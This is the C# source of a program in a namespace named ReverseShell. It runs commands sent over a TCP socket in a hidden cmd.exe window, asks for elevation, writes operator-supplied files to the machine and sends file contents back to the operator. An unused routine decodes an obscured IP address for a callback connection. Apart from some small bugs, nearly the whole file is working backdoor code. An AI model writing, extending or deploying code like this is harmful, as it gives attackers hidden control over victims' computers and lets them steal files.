using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading;
using System.Text;
using System.Diagnostics;
using System.Net;

namespace ReverseShell
{
    public class Program 
	{
        private const string encodedIp = "";
		private const string key = "";
		private const int port = 8888;
		
		private const int connectionFailedSleepTime = 60000;
		
		private static TcpClient socket;
        private static TcpListener incomingSocket = new TcpListener(IPAddress.Any, port);
		
		private static Queue<string> commandQueue = new Queue<string>();
        private static List<string> cmdCommandList = new List<string>();
		
		private static Process cmdConsole = new Process();
        private static Thread incomingThread;
		
        public static void Main()
        {
            commandQueue.Clear();
            cmdCommandList.Clear();
            socket = new TcpClient();

            try
			{
                InitAcceptConnection();
                while (!socket.Connected)
                {
                    Thread.Sleep(10);
                }
				
				Thread recieveThread = new Thread(RecieveLoop);
				recieveThread.Start();
				
				while(true)
				{
					if (commandQueue.Count == 0 && !socket.Connected)
					{
						break;
					}
					
					if (commandQueue.Count == 0)
					{
						Thread.Sleep(100);
						continue;
					}
					
					string command = commandQueue.Dequeue();
					
					ExecuteCommand(command);
				}
			}
			catch
			{
				Main();
				return;
			}
        }
        
        public static void TryUntilConnect()
        {
        	while (!socket.Connected)
        	{
        		Thread.Sleep(connectionFailedSleepTime);
				
        		socket.Connect(SAREncryption.Decrypt(encodedIp, key), port);
        	}
        }
        
        public static void RecieveLoop()
        {
			try
			{
				while(socket.Connected)
				{
					var networkStream = socket.GetStream();
					
					byte[] recievedBytes = new byte[socket.ReceiveBufferSize];
					
					networkStream.Read(recievedBytes, 0, socket.ReceiveBufferSize);
					
					string recievedString = Encoding.ASCII.GetString(recievedBytes);
					
					commandQueue.Enqueue(recievedString);
				}
			}
			catch
			{
				RecieveLoop();
				return;
			}
        }
        
        public static void ExecuteCommand(string fullCommand)
        {
			if (fullCommand.StartsWith("!rs "))
			{
				string command = fullCommand.Substring(4).Split('!')[0];
				List<string> args = fullCommand.Substring(4).Split('!').Except(new string[] { command }).ToList();

                switch (command)
                {
                    case "execute":

                        ConsoleCommand(cmdCommandList.ToArray());
                        cmdCommandList.Clear();

                        break;

                    case "remove_self":

                        SendMessage("Not implemented.");
                        //not implemented

                        break;

                    case "save_to_file":

                        File.WriteAllText(args[0], args[1].Substring(1));

                        SendMessage("File saved.");

                        break;

                    case "send_file":

                        SendMessage("!rs save_to_file !f " + File.ReadAllText(args[0]));

                        break;

                    case "stop":

                        Environment.Exit(0);

                        break;

                    default:

                        SendMessage("Unknown command");

                        break;
                }
			}
            else
            {
                cmdCommandList.Add(fullCommand);
            }
        }

        public static void StartConsole()
        {
            cmdConsole.StartInfo = new ProcessStartInfo("cmd.exe")
            {
                CreateNoWindow = true,
                RedirectStandardError = true,
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = false,
                WorkingDirectory = "C:/",
                Verb = "runas"
            };

            cmdConsole.Start();
        }

        public static void StopConsole()
        {
            cmdConsole.StandardInput.WriteLine("exit");
            cmdConsole.StandardInput.Flush();
        }

        public static void ConsoleCommand(string[] commands)
        {
            StartConsole();

            foreach (string command in commands)
            {
                cmdConsole.StandardInput.WriteLine(command);
                cmdConsole.StandardInput.Flush();
            }

            StopConsole();

            SendMessage(cmdConsole.StandardOutput.ReadToEnd());

            return;
        }

        public static void SendMessage(string message)
        {
            if (!socket.Connected)
                return;

            var stream = socket.GetStream();

            byte[] bytes = Encoding.ASCII.GetBytes(message);

            stream.Write(bytes, 0, bytes.Length);
            stream.Flush();
        }

        public static void InitAcceptConnection()
        {
            incomingThread = new Thread(AcceptConnectionLoop);
            incomingThread.Start();
        }

        public static void AcceptConnectionLoop()
        {
            while (true)
            {
                TcpClient client = incomingSocket.AcceptTcpClient();

                if (socket.Connected)
                {
                    client.Close();
                }
            }
        }
    }
    
    public static class SAREncryption
    {
    	public static string Encrypt(string source, string key)
        {
        	string output = string.Empty;
        	
        	char[] chars = source.ToCharArray();
        	char[] keyChars = key.ToCharArray();
        	
        	int[] encoded = new int[chars.Length];
        	
        	for (int i = 0, k= 0; i < chars.Length; i++)
        	{
        		if (k >= keyChars.Length)
        			k = 0;
        			
        		encoded[i] = (byte)chars[i] + (byte)keyChars[k];
        		
        		output += (char)encoded[i];
        		
        		k++;
        	}
        	
        	output.Reverse();
        	
        	return output;
        }
        
        public static string Decrypt(string source, string key)
        {
        	source.Reverse();
        	
        	string output = string.Empty;
        	
        	char[] chars = source.ToCharArray();
        	char[] keyChars = key.ToCharArray();
        	
        	int[] decoded = new int[chars.Length];
        	
        	for (int i = 0, k = 0; i < chars.Length; i++)
        	{
        		if (k >= keyChars.Length)
        			k = 0;
        			
        		decoded[i] = (byte)chars[i] - (byte)keyChars[k];
        		output += (char)decoded[i];
        		
        		k++;
        	}
        	
        	return output;
        }
        
        public static void EncryptToFile(string source, string key, string path)
        {
        	string encrypted = Encrypt(source, key);
        	
        	File.WriteAllText(encrypted, path);
        }
        
        public static string DecryptFromFile(string key, string path)
        {
        	string source = File.ReadAllText(path);
        	
        	return Decrypt(source, key);
        }
    }
}